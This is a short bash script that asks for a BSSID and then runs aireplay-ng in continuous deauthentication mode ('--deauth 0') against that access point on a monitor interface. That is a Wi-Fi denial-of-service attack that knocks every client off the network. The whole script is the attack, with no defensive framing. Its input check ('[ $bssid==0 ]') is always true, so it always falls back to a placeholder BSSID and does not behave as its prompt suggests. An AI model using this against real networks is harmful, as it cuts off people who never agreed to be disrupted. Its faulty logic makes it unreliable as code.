#!/bin/bash
a="default bssid here"

read -p "Enter BSSID: " bssid

if [ $bssid==0 ]; then
	echo "[/] Using home bssid..."
	bssid=$a
fi

echo "BSSID found: $bssid"

sudo aireplay-ng --deauth 0 -a $bssid wlo1mon
